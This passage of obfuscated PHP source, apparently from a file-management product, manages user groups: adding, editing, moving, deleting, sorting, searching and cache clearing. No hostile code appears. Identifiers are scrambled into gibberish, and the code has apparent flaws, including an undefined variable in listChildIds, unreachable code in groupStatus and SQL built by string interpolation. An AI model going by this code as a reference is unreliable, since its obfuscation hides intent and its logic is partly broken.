) { $èÀ†ş®  = 0; } $ú³·š¢ä[$İëÆ¯î[1996]] = $èÀ†ş®  + 1; } if (!empty($Öí‚Î[$İëÆ¯î[1972]])) { $ú³·š¢ä[$İëÆ¯î[1972]] = $Öí‚Î[$İëÆ¯î[1972]]; } $Ú‹ÚÔ¼­ = $this->add($ú³·š¢ä); $this->setNamePinyin($Ú‹ÚÔ¼­, $ú³·š¢ä[$İëÆ¯î[32]]); if (isset($Öí‚Î[$İëÆ¯î[2062]])) { $this->metaSet($Ú‹ÚÔ¼­, array($İëÆ¯î[2062] => $Öí‚Î[$İëÆ¯î[2062]], $İëÆ¯î[2063] => $Öí‚Î[$İëÆ¯î[2063]])); unset($Öí‚Î[$İëÆ¯î[2062]]); unset($Öí‚Î[$İëÆ¯î[2063]]); } Model($İëÆ¯î[1421])->groupRootAdd($Ú‹ÚÔ¼­); $this->_clearCache($Öí‚Î[$İëÆ¯î[202]]); return $Ú‹ÚÔ¼­; } protected function groupEdit($‹¼ı¹¸Š, $Ÿ˜±‡²Ò) { $·æ“ìÛÅ =& $_SERVER[ÕŸ²ó÷å]; $®ìƒ´Œ„ = $this->getInfoSimple($‹¼ı¹¸Š); if (!$®ìƒ´Œ„) { return !1; } if (!empty($Ÿ˜±‡²Ò[$·æ“ìÛÅ[202]])) { $‚Îá«Ğµ = $this->getInfoSimple($Ÿ˜±‡²Ò[$·æ“ìÛÅ[202]]); if (!$‚Îá«Ğµ) { return !1; } if ($®ìƒ´Œ„[$·æ“ìÛÅ[1972]] == $‚Îá«Ğµ[$·æ“ìÛÅ[1972]]) { return !1; } if ($Ÿ˜±‡²Ò[$·æ“ìÛÅ[202]] != $®ìƒ´Œ„[$·æ“ìÛÅ[202]]) { if ($‚Îá«Ğµ[$·æ“ìÛÅ[593]] !== $®ìƒ´Œ„[$·æ“ìÛÅ[593]] && strpos($‚Îá«Ğµ[$·æ“ìÛÅ[593]], $®ìƒ´Œ„[$·æ“ìÛÅ[593]] . $®ìƒ´Œ„[$·æ“ìÛÅ[1972]] . $·æ“ìÛÅ[50]) === 0) { return !1; } $Ÿ˜±‡²Ò[$·æ“ìÛÅ[661]] = $‚Îá«Ğµ[$·æ“ìÛÅ[593]] . $Ÿ˜±‡²Ò[$·æ“ìÛÅ[202]] . $·æ“ìÛÅ[50]; $this->_changeChildLevel($®ìƒ´Œ„, $‚Îá«Ğµ); $this->_clearCache($‚Îá«Ğµ[$·æ“ìÛÅ[1972]]); $this->_clearCache($®ìƒ´Œ„[$·æ“ìÛÅ[202]]); } } if (isset($Ÿ˜±‡²Ò[$·æ“ìÛÅ[32]])) { $this->setNamePinyin($‹¼ı¹¸Š, $Ÿ˜±‡²Ò[$·æ“ìÛÅ[32]]); } if (isset($Ÿ˜±‡²Ò[$·æ“ìÛÅ[2062]])) { $this->metaSet($‹¼ı¹¸Š, array($·æ“ìÛÅ[2062] => $Ÿ˜±‡²Ò[$·æ“ìÛÅ[2062]], $·æ“ìÛÅ[2063] => $Ÿ˜±‡²Ò[$·æ“ìÛÅ[2063]])); unset($Ÿ˜±‡²Ò[$·æ“ìÛÅ[2062]]); unset($Ÿ˜±‡²Ò[$·æ“ìÛÅ[2063]]); } $this->_clearChildrenCache($®ìƒ´Œ„); return $this->where(array($·æ“ìÛÅ[2064] => $‹¼ı¹¸Š))->save($Ÿ˜±‡²Ò); } private function _clearChildrenCache($íßê÷ı÷) { $åØ¸ßê =& $_SERVER[ÕŸ²ó÷å]; $¼™á»Êé = array($åØ¸ßê[661] => array($åØ¸ßê[621], $íßê÷ı÷[$åØ¸ßê[593]] . $íßê÷ı÷[$åØ¸ßê[1972]] . $åØ¸ßê[622])); $À²ÒœÌè = $this->field($åØ¸ßê[1972])->where($¼™á»Êé)->select(); foreach ($À²ÒœÌè as $£¥ôùÔÁ) { $this->_clearCache($£¥ôùÔÁ[$åØ¸ßê[1972]]); } } private function _clearCache($Î¿²¦Õ€) { $ö¼¢²’µ =& $_SERVER[ÕŸ²ó÷å]; $this->cacheFunctionClear($ö¼¢²’µ[2058], $Î¿²¦Õ€); $this->cacheFunctionClear($ö¼¢²’µ[2059], $Î¿²¦Õ€); } private function _changeChildLevel($ğÒô÷êÁ, $ƒÕØ—íø, $ó”ì½¦— = false) { $Â˜úº™Í =& $_SERVER[ÕŸ²ó÷å]; $†É…‹Ÿç = $ğÒô÷êÁ[$Â˜úº™Í[593]] . $ğÒô÷êÁ[$Â˜úº™Í[1972]] . $Â˜úº™Í[50]; $“…²ü¥» = $ƒÕØ—íø[$Â˜úº™Í[593]] . $ƒÕØ—íø[$Â˜úº™Í[1972]] . $Â˜úº™Í[50] . $ğÒô÷êÁ[$Â˜úº™Í[1972]] . $Â˜úº™Í[50]; if ($ó”ì½¦—) { $“…²ü¥» = $ƒÕØ—íø[$Â˜úº™Í[593]] . $ƒÕØ—íø[$Â˜úº™Í[1972]] . $Â˜úº™Í[50]; } $ñ³üÔÕÅ = array($Â˜úº™Í[661] => array($Â˜úº™Í[621], $ğÒô÷êÁ[$Â˜úº™Í[593]] . $ğÒô÷êÁ[$Â˜úº™Í[1972]] . $Â˜úº™Í[622])); $ãåçö¶“ = array($Â˜úº™Í[661] => array($Â˜úº™Í[670], "\162\x65\x70\x6c\x61\x63\x65\50\160\x61\162\145\x6e\164\x4c\x65\166\x65\x6c\x2c\x27{$†É…‹Ÿç}\x27\54\x27{$“…²ü¥»}\x27\51")); $this->_clearChildrenCache($ğÒô÷êÁ); $this->where($ñ³üÔÕÅ)->data($ãåçö¶“)->save(); } public function setNamePinyin($¦ªå÷ğÉ, $ùæÑ¸€¿ = false) { $…Æ¥Ò¶¦ =& $_SERVER[ÕŸ²ó÷å]; if (!$ùæÑ¸€¿) { $íÓ¢’«œ = $this->getInfoSimple($¦ªå÷ğÉ); $ùæÑ¸€¿ = $íÓ¢’«œ[$…Æ¥Ò¶¦[32]]; } if (!Input::check($ùæÑ¸€¿, $…Æ¥Ò¶¦[664])) { $this->metaSet($¦ªå÷ğÉ, $…Æ¥Ò¶¦[547], null); $this->metaSet($¦ªå÷ğÉ, $…Æ¥Ò¶¦[546], null); return; } $íÂ¼ù‡ = array($…Æ¥Ò¶¦[547] => str_replace($…Æ¥Ò¶¦[53], $…Æ¥Ò¶¦[12], Pinyin::get($ùæÑ¸€¿)), $…Æ¥Ò¶¦[546] => Pinyin::get($ùæÑ¸€¿, $…Æ¥Ò¶¦[665])); $this->metaSet($¦ªå÷ğÉ, $íÂ¼ù‡); } protected function metaSet($‚’ºõëó, $Ä³¹í“± = null, $–ØÕ«™Ó = null) { $this->_clearCache($‚’ºõëó); return parent::metaSet($‚’ºõëó, $Ä³¹í“±, $–ØÕ«™Ó); } protected function groupStatus($İÖÅÏ‘Ë, $ÃÒ½¥¤À) { $¤Á·ñ‚¥ =& $_SERVER[ÕŸ²ó÷å]; $½’¾Ñ¦ = $this->getInfoSimple($İÖÅÏ‘Ë); if (!$½’¾Ñ¦) { return !1; } $this->_clearCache($İÖÅÏ‘Ë); return $this->metaSet($İÖÅÏ‘Ë, $¤Á·ñ‚¥[834], $ÃÒ½¥¤À); if ($ÃÒ½¥¤À == $¤Á·ñ‚¥[101]) { $ü…¤Ë­Ì = $this->parentLevelArray($½’¾Ñ¦[$¤Á·ñ‚¥[593]]); } else { } $ü…¤Ë­Ì[] = $½’¾Ñ¦[$¤Á·ñ‚¥[1972]]; $ÈùÄÆÊç = array(); foreach ($ü…¤Ë­Ì as $İÖÅÏ‘Ë) { $ÈùÄÆÊç[] = array($¤Á·ñ‚¥[1972] => $İÖÅÏ‘Ë, $¤Á·ñ‚¥[107] => $¤Á·ñ‚¥[834], $¤Á·ñ‚¥[459] => $ÃÒ½¥¤À); $this->_clearCache($İÖÅÏ‘Ë); } return Model($¤Á·ñ‚¥[2065])->addAll($ÈùÄÆÊç, array(), !0); } protected function groupRemove($ºğÀ›‰Æ, $ÄÄ¦ú¶ê = false) { $÷òËŠû¹ =& $_SERVER[ÕŸ²ó÷å]; $á¡‚Ğò× = array($÷òËŠû¹[1972] => $ºğÀ›‰Æ); $©£Æ¥ğ¤ = $this->where($á¡‚Ğò×)->find(); if (!$©£Æ¥ğ¤ || $©£Æ¥ğ¤[$÷òËŠû¹[202]] == 0) { return !1; } if (!$ÄÄ¦ú¶ê) { $Ë¦¤û”ˆ = $this->getInfoSimple($©£Æ¥ğ¤[$÷òËŠû¹[202]]); $this->_changeChildLevel($©£Æ¥ğ¤, $Ë¦¤û”ˆ, !0); $this->where(array($÷òËŠû¹[202] => $ºğÀ›‰Æ))->save(array($÷òËŠû¹[202] => $©£Æ¥ğ¤[$÷òËŠû¹[202]])); $this->_clearCache($Ë¦¤û”ˆ[$÷òËŠû¹[1972]]); } Model($÷òËŠû¹[2065])->where($á¡‚Ğò×)->delete(); Model($÷òËŠû¹[2066])->where($á¡‚Ğò×)->delete(); Model($÷òËŠû¹[908])->groupRootRemove($ºğÀ›‰Æ); $this->_clearCache($©£Æ¥ğ¤[$÷òËŠû¹[202]]); return $this->where($á¡‚Ğò×)->delete(); } protected function groupSort($Åğöïø) { $ó‚ÃËğ‹ =& $_SERVER[ÕŸ²ó÷å]; $¿¹­×º· = array(); foreach ($Åğöïø as $äÜÈîÊº => $ë‹ÂÈ Ù) { $¿¹­×º·[] = array($ó‚ÃËğ‹[1972], $ë‹ÂÈ Ù, $ó‚ÃËğ‹[1996], $äÜÈîÊº + 1); } $this->saveAll($¿¹­×º·); } public function listData() { $× Í¨ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($× Í¨[$_SERVER[ÕŸ²ó÷å][454]]); return $× Í¨; } private function _makeOrder($ÇªÄş”î = '') { $Ä¥ê ‰ =& $_SERVER[ÕŸ²ó÷å]; $²£¬Ò«’ = array($Ä¥ê ‰[1972], $Ä¥ê ‰[32], $Ä¥ê ‰[1960], $Ä¥ê ‰[241]); $¶±¾Ù„‡ = array($Ä¥ê ‰[532] => $Ä¥ê ‰[533], $Ä¥ê ‰[534] => $Ä¥ê ‰[535]); $úâ‘¦÷¢ = Input::get($Ä¥ê ‰[539], $Ä¥ê ‰[7], $Ä¥ê ‰[1976], $²£¬Ò«’); $Ğà£˜è¸ = Input::get($Ä¥ê ‰[540], $Ä¥ê ‰[7], $Ä¥ê ‰[2067], array($Ä¥ê ‰[2067], $Ä¥ê ‰[534])); $Ğà£˜è¸ = $¶±¾Ù„‡[$Ğà£˜è¸]; $ÇªÄş”î = $ÇªÄş”î . "{$úâ‘¦÷¢}\x20{$Ğà£˜è¸}\x2c\x20\147\162\157\x75\x70\x49\104\40\141\163\x63"; return $this->order($ÇªÄş”î); } public function listChild($ù—ÎÆëÉ) { $ğÃàæà× =& $_SERVER[ÕŸ²ó÷å]; $ÈÓÓæâ = $this->where(array($ğÃàæà×[202] => $ù—ÎÆëÉ))->_makeOrder()->selectPage(200); $this->_listDataApply($ÈÓÓæâ[$ğÃàæà×[454]]); return $ÈÓÓæâ; } public function listChildIds($‘·£é™à) { $º³Òòñô =& $_SERVER[ÕŸ²ó÷å]; if (is_string($Ù´ï“÷)) { $‘·£é™à = explode($º³Òòñô[50], $‘·£é™à); } $Æ³ÇŒ» = $this->where(array($º³Òòñô[1972] => array($º³Òòñô[7], $‘·£é™à)))->field($º³Òòñô[2068])->select(); if (!$Æ³ÇŒ») { return !1; } $Ù¶ËãöÖ = array(); foreach ($Æ³ÇŒ» as $¡‡í¢ßÛ) { $Ù¶ËãöÖ[] = "\x73\x65\x6c\x65\143\x74\40\147\162\157\165\x70\111\x44\x20\x66\x72\157\x6d\40\x60\147\x72\x6f\x75\x70\x60\40\x77\x68\x65\162\x65\40\x70\141\x72\145\x6e\164\x4c\145\166\145\154\40\x6c\x69\x6b\145\40\47{$¡‡í¢ßÛ[$º³Òòñô[593]]}{$¡‡í¢ßÛ[$º³Òòñô[1972]]}\x2c\45\47"; } $Ù¶ËãöÖ = implode($º³Òòñô[2069], $Ù¶ËãöÖ); $Æ³ÇŒ» = $this->query($Ù¶ËãöÖ); if (!$Æ³ÇŒ») { return array(); } $‘·£é™à = array_to_keyvalue($Æ³ÇŒ», $º³Òòñô[12], $º³Òòñô[1972]); return array_unique($‘·£é™à); } public function listByID($ ¤°‡µ ) { $ßíÄÆôÆ =& $_SERVER[ÕŸ²ó÷å]; if (!$ ¤°‡µ ) { return array(); } $«üßĞ¤Ä = array($ßíÄÆôÆ[1972] => array($ßíÄÆôÆ[7], $ ¤°‡µ )); $­âô¬­ˆ = $this->where($«üßĞ¤Ä)->select(); $­âô¬­ˆ = array_sort_keep($­âô¬­ˆ, $ßíÄÆôÆ[1972], $ ¤°‡µ ); $this->_listDataApply($­âô¬­ˆ); return $­âô¬­ˆ; } public function listSearch($˜ø¼ôÏ¥) { $åŠØæ›„ =& $_SERVER[ÕŸ²ó÷å]; $³Õ‹œ¥ = trim($˜ø¼ôÏ¥[$åŠØæ›„[2070]]); $Ş•Ú©ÓÖ = explode($åŠØæ›„[53], $³Õ‹œ¥); if (!$³Õ‹œ¥ || count($Ş•Ú©ÓÖ) == 1) { return $this->listSearchNow($˜ø¼ôÏ¥); } $°¹èâÇ— = array($åŠØæ›„[454] => array()); foreach ($Ş•Ú©ÓÖ as $·³Œ†¾Å) { if (!trim($·³Œ†¾Å)) { continue; } $˜ø¼ôÏ¥[$åŠØæ›„[2070]] = $·³Œ†¾Å; $¨¡²ı×µ = $this->listSearchNow($˜ø¼ôÏ¥); $°¹èâÇ—[$åŠØæ›„[454]] = array_merge($°¹èâÇ—[$åŠØæ›„[454]], $¨¡²ı×µ[$åŠØæ›„[454]]); } $°¹èâÇ—[$åŠØæ›„[454]] = array_unique_by_key($°¹èâÇ—[$åŠØæ›„[454]], $åŠØæ›„[1972]); $°¹èâÇ—[$åŠØæ›„[451]] = array($åŠØæ›„[452] => count($°¹èâÇ—[$åŠØæ›„[454]]), $åŠØæ›„[448] => 20, $åŠØæ›„[438] => 1, $åŠØæ›„[453] => 1); return $°¹èâÇ—; } public function listSearchNow($êÒñğ²«) { $–¥ªØêÅ =& $_SERVER[ÕŸ²ó÷å]; $ú’ÌÔ‘Œ = trim($êÒñğ²«[$–¥ªØêÅ[2070]]); $Œ—µæÅÌ = isset($êÒñğ²«[$–¥ªØêÅ[2071]]) ? $êÒñğ²«[$–¥ªØêÅ[2071]] : !1; if (!trim($ú’ÌÔ‘Œ)) { return !1; } $ú’ÌÔ‘Œ = str_replace($–¥ªØêÅ[2072], $–¥ªØêÅ[2073], $ú’ÌÔ‘Œ); $×ÅˆÏ¯ñ = array($–¥ªØêÅ[1972] => array($–¥ªØêÅ[468], "{$ú’ÌÔ‘Œ}\x25"), $–¥ªØêÅ[32] => array($–¥ªØêÅ[468], "\x25{$ú’ÌÔ‘Œ}\45"), $–¥ªØêÅ[1081] => $–¥ªØêÅ[2074]); if ($Œ—µæÅÌ) { $Ã”ÓÜªÊ = $this->getInfoSimple($Œ—µæÅÌ); $¯îêÜ‰â = $Ã”ÓÜªÊ[$–¥ªØêÅ[593]] . $Œ—µæÅÌ . $–¥ªØêÅ[622]; $×ÅˆÏ¯ñ = array($×ÅˆÏ¯ñ, array($–¥ªØêÅ[593] => array($–¥ªØêÅ[468], $¯îêÜ‰â))); } $×ÅˆÏ¯ñ = $this->parseWhereLike($×ÅˆÏ¯ñ); $Õ·äÂ£ = $this->_makeOrder()->where($×ÅˆÏ¯ñ)->selectPage(20); $Õ·äÂ£ = $Õ·äÂ£ ? $Õ·äÂ£ : array($–¥ªØêÅ[454] => array(), $–¥ªØêÅ[451] => array()); if (!$Õ·äÂ£ || count($Õ·äÂ£[$–¥ªØêÅ[454]]) < 5 && Input::check($ú’ÌÔ‘Œ, $–¥ªØêÅ[403])) { $Ó­†™©Š = $this->groupChildrenAll($Œ—µæÅÌ); $²±›ÁÏˆ = $this->_searchFromMeta($–¥ªØêÅ[546], $ú’ÌÔ‘Œ, 10, $Ó­†™©Š); $•±ìµŞŸ = $this->_searchFromMeta($–¥ªØêÅ[547], $ú’ÌÔ‘Œ, 10, $Ó­†™©Š); $ø›×“¸û = array_merge($²±›ÁÏˆ, $•±ìµŞŸ, $Õ·äÂ£[$–¥ªØêÅ[454]]); $Õ·äÂ£[$–¥ªØêÅ[454]] = array_unique_by_key($ø›×“¸û, $–¥ªØêÅ[1972]); $Õ·äÂ£[$–¥ªØêÅ[451]][$–¥ªØêÅ[452]] = count($Õ·äÂ£[$–¥ªØêÅ[454]]); $Õ·äÂ£[$–¥ªØêÅ[451]][$–¥ªØêÅ[453]] = ceil($Õ·äÂ£[$–¥ªØêÅ[451]][$–¥ªØêÅ[452]] / $Õ·äÂ£[$–¥ªØêÅ[451]][$–¥ªØêÅ[448]]); } $this->_listDataApply($Õ·äÂ£[$–¥ªØêÅ[454]]); return $Õ·äÂ£; } protected function groupChildrenAll($¾â“ää©) { $¯ƒ‡¢–Í =& $_SERVER[ÕŸ²ó÷å]; if (!$¾â“ää©) { return !1; } if (!is_array($¾â“ää©)) { $¾â“ää© = array($¾â“ää©); } $­äšØî = $¾â“ää©; foreach ($¾â“ää© as $Ã·€«Úã) { $çœˆ¨ì = $this->getInfoSimple($Ã·€«Úã); $‡šãîË» = array($¯ƒ‡¢–Í[593] => array($¯ƒ‡¢–Í[468], $çœˆ¨ì[$¯ƒ‡¢–Í[593]] . $Ã·€«Úã . $¯ƒ‡¢–Í[622])); $ğ³Ë“ = $this->field($¯ƒ‡¢–Í[1972])->where($‡šãîË»)->select(); $­äšØî = array_merge($­äšØî, array_to_keyvalue($ğ³Ë“, $¯ƒ‡¢–Í[12], $¯ƒ‡¢–Í[1972])); } return array_unique($­äšØî); } private function _searchFromMeta($ÊÍ‚®áŞ, $ŠÈ–éÓŠ, $›¾Ïç×ß, $ä¤õ¸¨Ó) { $Ó”¿»»á =& $_SERVER[ÕŸ²ó÷å]; $ŠÈ–éÓŠ = strtolower($ŠÈ–éÓŠ); $ÂÌØ¯ñ® = array($Ó”¿»»á[107] => $ÊÍ‚®áŞ, $Ó”¿»»á[459] => array($Ó”¿»»á[468], "\x25{$ŠÈ–éÓŠ}\45")); $ÂÌØ¯ñ® = $this->parseWhereLike($ÂÌØ¯ñ®); if ($ä¤õ¸¨Ó) { $ÂÌØ¯ñ®[$Ó”¿»»á[1972]] = array($Ó”¿»»á[7], $ä¤õ¸¨Ó); } $Óº¸æ€  = Model($Ó”¿»»á[2075])->where($ÂÌØ¯ñ®)->limit($›¾Ïç×ß)->select(); if (!$Óº¸æ€ ) { return array(); } $Óº¸æ€  = array_to_keyvalue($Óº¸æ€ , $Ó”¿»»á[12], $Ó”¿»»á[1972]); $Ù«™¨šÉ = $this->where(array($Ó”¿»»á[2064] => array($Ó”¿»»á[7], $Óº¸æ€ )))->select(); if (!$Ù«™¨šÉ) { return array(); } return $Ù«™¨šÉ; } protected function _listDataApplyItem($Å½±¾’¤) { $‘úİı = array($Å½±¾’¤); $this->_listDataApply($‘úİı); return $‘úİı[0]; } protected function _listDataApply(&$ˆŞİáÎò) { $şõÓ…• =& $_SERVER[ÕŸ²ó÷å]; if (!$ˆŞİáÎò) { return; } $Áª‚•İÕ = array_to_keyvalue($ˆŞİáÎò, $şõÓ…•[12], $şõÓ…•[1972]); $this->_listAppendChildren($ˆŞİáÎò); $this->_listAppendChildrenMember($ˆŞİáÎò); $this->_listAppendMeta($ˆŞİáÎò, $Áª‚•İÕ); $this->_listAppendParent($ˆŞİáÎò); $this->_listAppendSourceRoot($ˆŞİáÎò, $Áª‚•İÕ); } private function _listAppendChildren(&$æ„”«…†) { $êó·ä–¢ =& $_SERVER[ÕŸ²ó÷å]; $îåóÈıÀ = array_to_keyvalue($æ„”«…†, $êó·ä–¢[12], $êó·ä–¢[1972]); $–½ª™  = array($êó·ä–¢[202] => array($êó·ä–¢[7], $îåóÈıÀ)); $ô¼åİíÄ = array($êó·ä–¢[202], $êó·ä–¢[2076] => $êó·ä–¢[574]); $şêÛòüô = $this->field($ô¼åİíÄ)->where($–½ª™ )->group($êó·ä–¢[202])->select(); $îÒ‡º·— = array_to_keyvalue($şêÛòüô, $êó·ä–¢[202], $êó·ä–¢[574]); foreach ($æ„”«…† as &$­£›‹×Ö) { $Îƒ¡Æí± = $­£›‹×Ö[$êó·ä–¢[1972]]; $­£›‹×Ö[$êó·ä–¢[2077]] = isset($îÒ‡º·—[$Îƒ¡Æí±]) ? intval($îÒ‡º·—[$Îƒ¡Æí±]) : !1; } unset($­£›‹×Ö); } private function _listAppendChildrenMember(&$ï¾ş’¤ß) { $õ‡ÚËÔ¬ =& $_SERVER[ÕŸ²ó÷å]; $¿°ªÕöê = array_to_keyvalue($ï¾ş’¤ß, $õ‡ÚËÔ¬[12], $õ‡ÚËÔ¬[1972]); $¥¦ß´× = array($õ‡ÚËÔ¬[1972] => array($õ‡ÚËÔ¬[7], $¿°ªÕöê)); $°‚ÒÓÑ® = array($õ‡ÚËÔ¬[1972], $õ‡ÚËÔ¬[2076] => $õ‡ÚËÔ¬[574]); $¦ÜèŠ­ = Model($õ‡ÚËÔ¬[2066])->field($°‚ÒÓÑ®)->where($¥¦ß´×)->group($õ‡ÚËÔ¬[1972])->select(); $¡ğ–¥ƒ› = array_to_keyvalue($¦ÜèŠ­, $õ‡ÚËÔ¬[1972], $õ‡ÚËÔ¬[574]); foreach ($ï¾ş’¤ß as &$çŒ¤›—) { $õÅò»½¡ = $çŒ¤›—[$õ‡ÚËÔ¬[1972]]; $çŒ¤›—[$õ‡ÚËÔ¬[2078]] = isset($¡ğ–¥ƒ›[$õÅò»½¡]) ? intval($¡ğ–¥ƒ›[$õÅò»½¡]) : !1; } unset($çŒ¤›—); } private function _listAppendMeta(&$ÍûëÖä±, $ÜèúÛ¡Š) { $¯ãòûá =& $_SERVER[ÕŸ²ó÷å]; $£Ö…Ü©¬ = array($¯ãòûá[1972] => array($¯ãòûá[7], $ÜèúÛ¡Š)); $èĞÍ•¦ = Model($¯ãòûá[2065])->where($£Ö…Ü©¬)->select(); $èĞÍ•¦ = array_to_keyvalue_group($èĞÍ•¦, $¯ãòûá[1972]); foreach ($èĞÍ•¦ as &$ñ–ÔîÊº) { $ñ–ÔîÊº = array_to_keyvalue($ñ–ÔîÊº, $¯ãòûá[107], $¯ãòûá[459]); } unset($ñ–ÔîÊº); foreach ($ÍûëÖä± as &$¼µÆÛ¼Â) { $¼µÆÛ¼Â[$¯ãòûá[548]] = array(); if (isset($èĞÍ•¦[$¼µÆÛ¼Â[$¯ãòûá[1972]]])) { $¼µÆÛ¼Â[$¯ãòûá[548]] = $èĞÍ•¦[$¼µÆÛ¼Â[$¯ãòûá[1972]]]; } } unset($¼µÆÛ¼Â); } protected function parentLevelArray($¢Çí™ıÄ) { $¬Á‘–ª’ =& $_SERVER[ÕŸ²ó÷å]; $¢Çí™ıÄ = explode($¬Á‘–ª’[50], trim($¢Çí™ıÄ, $¬Á‘–ª’[50])); $¢Çí™ıÄ = array_remove_value($¢Çí™ıÄ, $¬Á‘–ª’[238]); return $¢Çí™ıÄ; } protected function parentInGroup($”Áú–Ô, $¸î¨Ò„¡) { $êëÑ³ş =& $_SERVER[ÕŸ²ó÷å]; $†½ƒ¬Ş = $this->getInfoSimple($”Áú–Ô); if (!$†½ƒ¬Ş) { return !0; } $­ß­ñ¯‡ = $this->parentLevelArray($†½ƒ¬Ş[$êëÑ³ş[593]]); $­ß­ñ¯‡[] = $”Áú–Ô; foreach ($­ß­ñ¯‡ as $”Áú–Ô) { if (in_array($”Áú–Ô . $êëÑ³ş[12], $¸î¨Ò„¡)) { return !0; } } return !1; } private function _listAppendParent(&$ºÜ³áà) { $¼òÈâÒ¯ =& $_SERVER[ÕŸ²ó÷å]; $ñ„…¿Ã = array(); foreach ($ºÜ³áà as &$›ñãªğÑ) { $ñ„…¿Ã[$›ñãªğÑ[$¼òÈâÒ¯[1972]]] = $›ñãªğÑ[$¼òÈâÒ¯[32]]; $ÖÌ†®¦¡ = $this->parentLevelArray($›ñãªğÑ[$¼òÈâÒ¯[593]]); foreach ($ÖÌ†®¦¡ as $«õµ») { if (!isset($ñ„…¿Ã[$«õµ»])) { $ñ„…¿Ã[$«õµ»] = 0; } } } unset($›ñãªğÑ); foreach ($ñ„…¿Ã as $…ÁªÏ–Ô => $÷ºÂšÁ†) { if ($÷ºÂšÁ†) { continue; } $Ì„ãà = $this->getInfoSimple($…ÁªÏ–Ô); $ñ„…¿Ã[$…ÁªÏ–Ô] = $Ì„ãà[$¼òÈâÒ¯[32]]; } $ºå¾¼€ = $GLOBALS[$¼òÈâÒ¯[6]][$¼òÈâÒ¯[102]][$¼òÈâÒ¯[2079]]; if (KodUser::isRoot()) { $ºå¾¼€ = !1; } foreach ($ºÜ³áà as &$›ñãªğÑ) { $ÖÌ†®¦¡ = $this->parentLevelArray($›ñãªğÑ[$¼òÈâÒ¯[593]]); $âñ¾ñß‚ = $¼òÈâÒ¯[12]; foreach ($ÖÌ†®¦¡ as $…ÁªÏ–Ô => $«õµ») { if ($ºå¾¼€ && $…ÁªÏ–Ô == 0) { continue; } $âñ¾ñß‚ .= $ñ„…¿Ã[$«õµ»] . $¼òÈâÒ¯[8]; } if ($ÖÌ†®¦¡) { $âñ¾ñß‚ .= $›ñãªğÑ[$¼òÈâÒ¯[32]]; } $›ñãªğÑ[$¼òÈâÒ¯[598]] = str_replace($¼òÈâÒ¯[601], $¼òÈâÒ¯[8], $âñ¾ñß‚); } unset($›ñãªğÑ); } private function _listAppendSourceRoot(&$ûĞåŒÔ„, $¥¶¿§¨Â) { $ØŸÉäÏ“ =& $_SERVER[ÕŸ²ó÷å]; $¶‚Ğ†ÈÓ = Model($ØŸÉäÏ“[908])->listSourceRoot(SourceModel::TYPE_GROUP, $¥¶¿§¨Â); $¶‚Ğ†ÈÓ = array_to_keyvalue($¶‚Ğ†ÈÓ, $ØŸÉäÏ“[578]); $¶‚Ğ†ÈÓ = array_remove_key($¶‚Ğ†ÈÓ, $ØŸÉäÏ“[578]); foreach ($ûĞåŒÔ„ as &$Ô®£ĞØ) { $Ô®£ĞØ[$ØŸÉäÏ“[100]] = $¶‚Ğ†ÈÓ[$Ô®£ĞØ[$ØŸÉäÏ“[1972]]] ? $¶‚Ğ†ÈÓ[$Ô®£ĞØ[$ØŸÉäÏ“[1972]]] : array(); } unset($Ô®£ĞØ); } protected function groupMerge($Ëß‹¶å¶) { $Ëß‹¶å¶ = array_values(array_unique($Ëß‹¶å¶)); $¸Ä¡âç¤ = array(); for ($÷ßíó¥ˆ = 0; $÷ßíó¥ˆ < count($Ëß‹¶å¶); $÷ßíó¥ˆ++) { $š´´—Ãš = !1; for ($”£±ßÏñ = 0; $”£±ßÏñ < count($Ëß‹¶å¶); $”£±ßÏñ++) { if ($÷ßíó¥ˆ == $”£±ßÏñ) { continue; } if ($this->isParentOf($Ëß‹¶å¶[$”£±ßÏñ], $Ëß‹¶å¶[$÷ßíó¥ˆ])) { $š´´—Ãš = !0; break; } } if (!$š´´—Ãš) { $¸Ä¡âç¤[] = $Ëß‹¶å¶[$÷ßíó¥ˆ]; } } return $¸Ä¡âç¤; } protected function isParentOf($¶Ä­ö¾, $™äƒİû®) { $»ºâÚ¢ß =& $_SERVER[ÕŸ²ó÷å]; if (!$¶Ä­ö¾ || !$™äƒİû® || $¶Ä­ö¾ == $™äƒİû®) { return !1; } $Ã¤­ÇÙ› = $this->getInfoSimple($¶Ä­ö¾); $¦è¥«¿Ğ = $this->getInfoSimple($™äƒİû®); $ƒ›…í²é = $Ã¤­ÇÙ›[$»ºâÚ¢ß[593]] . $¶Ä­ö¾ . $»ºâÚ¢ß[50]; if (substr($¦è¥«¿Ğ[$»ºâÚ¢ß[593]], 0, strlen($ƒ›…í²é)) == $ƒ›…í²é) { return !0; } return !1; } public function groupShowRoot($×êÆš“‹, $ü®Ä¼Ú¯ = false) { $—¿˜÷®Ì =& $_SERVER[ÕŸ²ó÷å]; $‡¿‘ÙÈÈ = $this->getInfo($×êÆš“‹); if (!$‡¿‘ÙÈÈ) { return array(); } $³±¹ñ†Ö = $this->parentLevelArray($‡¿‘ÙÈÈ[$—¿˜÷®Ì[593]]); $Íõº‹À³ = array($×êÆš“‹); if (count($³±¹ñ†Ö) == 0) { return $Íõº‹À³; } if ($ü®Ä¼Ú¯ && count($³±¹ñ†Ö) == 1) { return $Íõº‹À³; } if (!$‡¿‘ÙÈÈ[$—¿˜÷®Ì[548]] || !isset($‡¿‘ÙÈÈ[$—¿˜÷®Ì[548]][$—¿˜÷®Ì[2062]]) || $‡¿‘ÙÈÈ[$—¿˜÷®Ì[548]][$—¿˜÷®Ì[2062]] == $—¿˜÷®Ì[860]) { return $this->groupShowRoot($³±¹ñ†Ö[count($³±¹ñ†Ö) - 1], $ü®Ä¼Ú¯); } if ($‡¿‘ÙÈÈ[$—¿˜÷®Ì[548]][$—¿˜÷®Ì[2062]] == $—¿˜÷®Ì[442]) { $ä»àÓÆ = explode($—¿˜÷®Ì[50], $‡¿‘ÙÈÈ[$—¿˜÷®Ì[548]][$—¿˜÷®Ì[2063]]); if ($ä»àÓÆ) { $Íõº‹À³ = array_merge($Íõº‹À³, $ä»àÓÆ); } } return $Íõº‹À³; } protected function resetParentLevel() { $ĞÀàœè =& $_SERVER[ÕŸ²ó÷å]; $¤ôûñ¬ = $ĞÀàœè[1972]; $íÒµÉ¡ = $this->select(); $íÒµÉ¡ = array_to_keyvalue($íÒµÉ¡, $¤ôûñ¬); foreach ($íÒµÉ¡ as $í¨’ûø) { $Üü®ùè = $í¨’ûø; $Üºøíá = array(); while ($Üü®ùè[$ĞÀàœè[202]] != 0) { $Üºøíá[] = $Üü®ùè[$ĞÀàœè[202]]; $Üü®ùè = 